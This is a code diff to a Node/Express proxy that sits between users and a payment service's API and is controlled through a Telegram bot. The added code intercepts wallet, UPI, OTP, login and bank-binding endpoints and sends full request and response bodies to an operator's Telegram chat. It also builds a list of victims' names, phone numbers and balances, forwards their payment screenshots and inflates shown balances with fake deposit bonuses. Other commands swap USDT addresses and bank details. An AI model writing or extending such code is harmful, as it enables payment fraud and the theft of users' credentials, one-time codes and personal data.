@@ -565,6 +565,9 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
+=== TRACKING ===
+/idtrack — Show all tracked user IDs with details
+
 === PER-ID COMMANDS ===
 /id deposit on <amount> <userId>
 /id deposit off <userId>
@@ -610,6 +613,26 @@ Example:
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+
+    if (text === '/idtrack') {
+      const tracked = data.trackedUsers || {};
+      const ids = Object.keys(tracked);
+      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
+      let m = '📋 Tracked User IDs:\n\n';
+      for (const uid of ids) {
+        const u = tracked[uid];
+        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
+        m += `👤 ID: ${uid}${hasOverride}\n`;
+        if (u.name) m += `   📛 Name: ${u.name}\n`;
+        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
+        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
+        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
+        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
+      }
+      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
+      await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
 
     if (text === '/banks') {
       if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
@@ -754,12 +777,18 @@ Example:
         const tracked = data.trackedUsers || {};
         const ids = Object.keys(tracked);
         if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users detected yet.'); return res.sendStatus(200); }
-        let m = '📋 Detected Users:\n\n';
+        let m = '📋 Tracked Users:\n\n';
         for (const uid of ids) {
           const u = tracked[uid];
           const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
-          m += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
+          m += `👤 ID: ${uid}${hasOverride}\n`;
+          if (u.name) m += `   📛 Name: ${u.name}\n`;
+          if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
+          if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
+          m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
+          m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
         }
+        if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
         await bot.sendMessage(chatId, m);
         return res.sendStatus(200);
       }
@@ -1238,10 +1267,54 @@ app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
 app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
   const data = await loadData();
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const url = ORIGINAL_API + req.originalUrl;
+    const fwd = {};
+    for (const [k, v] of Object.entries(req.headers)) {
+      const kl = k.toLowerCase();
+      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      fwd[k] = v;
+    }
+    fwd['host'] = 'api.ezpaycenter.com';
+    const opts = { method: req.method, headers: fwd };
+    if (req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      fwd['content-length'] = String(req.rawBody.length);
+    }
+    const response = await fetch(url, opts);
+    const respBody = await response.text();
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const kl = key.toLowerCase();
+      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+    let jsonResp = null;
+    try { jsonResp = JSON.parse(respBody); } catch(e) {}
     const userId = extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]`).catch(()=>{});
+      const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
+      const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
+      const bodyFields = req.parsedBody || {};
+      const orderId = bodyFields.orderId || bodyFields.orderCode || 'N/A';
+      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderId}`).catch(()=>{});
+      if (imgUrls.length > 0) {
+        for (const imgUrl of imgUrls.slice(0, 3)) {
+          try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]` }); } catch(e) {
+            bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
+          }
+        }
+      }
+      const respData = getResponseData(jsonResp);
+      if (respData && typeof respData === 'object') {
+        const imgField = respData.paymentImgUser || respData.imageUrl || respData.imgUrl || respData.image || respData.url || '';
+        if (imgField) {
+          try { await bot.sendPhoto(data.adminChatId, imgField, { caption: `📸 Server Image [${userId || 'N/A'}]` }); } catch(e) {
+            bot.sendMessage(data.adminChatId, `📸 Server Image URL: ${imgField}`).catch(()=>{});
+          }
+        }
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1250,10 +1323,43 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
 app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
   const data = await loadData();
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const url = ORIGINAL_API + req.originalUrl;
+    const fwd = {};
+    for (const [k, v] of Object.entries(req.headers)) {
+      const kl = k.toLowerCase();
+      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      fwd[k] = v;
+    }
+    fwd['host'] = 'api.ezpaycenter.com';
+    const opts = { method: req.method, headers: fwd };
+    if (req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      fwd['content-length'] = String(req.rawBody.length);
+    }
+    const response = await fetch(url, opts);
+    const respBody = await response.text();
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const kl = key.toLowerCase();
+      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+    let jsonResp = null;
+    try { jsonResp = JSON.parse(respBody); } catch(e) {}
     const userId = extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]`).catch(()=>{});
+      const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
+      const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
+      bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+      if (imgUrls.length > 0) {
+        for (const imgUrl of imgUrls.slice(0, 3)) {
+          try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch(e) {
+            bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
+          }
+        }
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1399,7 +1505,41 @@ app.all('/app/api/memberManager/withdrawHistoryDetail', async (req, res) => {
 });
 
 app.all('/app/api/memberManager/mine', async (req, res) => {
-  await proxyAndAddBonus(req, res);
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const respData = getResponseData(jsonResp);
+    const userId = respData?.id || respData?.memberId || respData?.userId || extractUserId(req, jsonResp);
+    if (userId) {
+      if (!data.trackedUsers) data.trackedUsers = {};
+      const existing = data.trackedUsers[String(userId)] || {};
+      data.trackedUsers[String(userId)] = {
+        ...existing,
+        lastAction: 'mine',
+        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        phone: existing.phone || respData?.memberPhone || respData?.phone || '',
+        name: respData?.memberName || respData?.realName || respData?.name || existing.name || '',
+        balance: respData?.balance || respData?.availableBalance || existing.balance || '',
+        orderCount: existing.orderCount || 0
+      };
+      await saveData(data);
+    }
+    if (data.adminChatId && bot) {
+      const name = respData?.memberName || respData?.realName || respData?.name || 'N/A';
+      const bal = respData?.balance || respData?.availableBalance || 'N/A';
+      const level = respData?.levelName || respData?.memberLevel || respData?.level || 'N/A';
+      bot.sendMessage(data.adminChatId, `👤 Mine [${userId || 'N/A'}]\n📛 Name: ${name}\n💰 Balance: ${bal}\n⭐ Level: ${level}`).catch(()=>{});
+    }
+    const reqUserId = extractUserId(req, jsonResp) || userId;
+    const eff = getEffectiveSettings(data, reqUserId);
+    if (eff.depositSuccess && respData && typeof respData === 'object') {
+      const bonus = eff.depositBonus || 0;
+      if (typeof respData.balance === 'number') respData.balance += bonus;
+      if (typeof respData.availableBalance === 'number') respData.availableBalance += bonus;
+      if (typeof respData.totalIncome === 'number') respData.totalIncome += bonus;
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
@@ -1420,6 +1560,36 @@ app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
+
+const WALLET_INTERCEPT_ENDPOINTS = [
+  '/app/api/v1/wallet/list',
+  '/app/api/v1/wallet/authStep',
+  '/app/api/v1/wallet/security',
+  '/app/api/v1/wallet/equipmentSendOtp',
+  '/app/api/v1/wallet/sendOtp',
+  '/app/api/v1/wallet/bindUpi',
+  '/app/api/v1/wallet/queryUpi',
+  '/app/api/v1/wallet/login',
+  '/app/api/v1/upi/list',
+  '/app/api/v1/upi/switch'
+];
+
+for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
+  app.all(ep, async (req, res) => {
+    const data = await loadData();
+    try {
+      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+      const userId = extractUserId(req, jsonResp);
+      const phone = getPhone(data, userId);
+      if (data.adminChatId && bot) {
+        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
+        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      }
+      sendJson(res, respHeaders, jsonResp, respBody);
+    } catch(e) { await transparentProxy(req, res); }
+  });
+}
 
 app.all('*', async (req, res) => {
   await transparentProxy(req, res);
